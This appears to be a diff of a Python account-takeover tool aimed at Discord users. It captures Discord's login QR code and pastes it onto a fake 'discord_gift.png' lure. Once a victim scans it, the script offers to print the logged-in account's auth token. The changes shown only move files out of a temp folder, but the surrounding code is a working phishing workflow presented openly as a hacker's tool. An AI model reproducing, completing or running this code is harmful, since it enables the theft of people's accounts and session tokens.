@@ -12,10 +12,10 @@ print("Made by vinnie the smexy hacker")
 DISCORD_LOGIN_URL = "https://discord.com/login"
 
 def paste_template():
-    im1 = Image.open('temp/template.png', 'r')
-    im2 = Image.open('temp/final_qr.png', 'r')
+    im1 = Image.open('template.png', 'r')
+    im2 = Image.open('final_qr.png', 'r')
     resized_img = im2.resize((200,210))
-    resized_img.save("temp/final_qr.png")
+    resized_img.save("final_qr.png")
     im1.paste(resized_img, (100, 387))
     im1.save('discord_gift.png', quality=95)
 
@@ -28,17 +28,17 @@ def setup(driver):
     # wait for qr code to load
     #print(qr_code["src"])
     # screenshot discord login, this will be displayed on the server webpage
-    driver.get_screenshot_as_file("temp/discord_login.png")
+    driver.get_screenshot_as_file("discord_login.png")
     print(f"{Fore.GREEN}[+] Got Screenshot of login!{Fore.RESET}")
 def crop():
-    image = Image.open('temp/discord_login.png')
+    image = Image.open('discord_login.png')
     left = 1504
     right = 1856
     top = 447
     bottom = 799
 
     im1 = image.crop((left,top,right,bottom))
-    im1.save('temp/final_qr.png', quality=95)
+    im1.save('final_qr.png', quality=95)
     print(f"{Fore.GREEN}[+] Cropped photo{Fore.RESET}")
 
 def get_account_token(driver):
@@ -50,8 +50,8 @@ setup(driver)
 time.sleep(10)
 crop()
 paste_template()
-os.system("rm -r temp/final_qr.png")
-os.system("rm -r temp/discord_login.png")
+os.system("rm -r final_qr.png")
+os.system("rm -r discord_login.png")
 print(f"{Fore.GREEN}[+] QR code saved into > discord_gift.png{Fore.RESET}")
 getacctoken = input(f"{Fore.GREEN}[+] Get Acc Token? (only if logged in) y/n: {Fore.RESET}")
 if getacctoken == 'y':
@@ -59,3 +59,4 @@ if getacctoken == 'y':
     print(f"{Fore.GREEN}[+] Auth token is:{Fore.RESET} {token} ")
 else:
     exit(1)
+
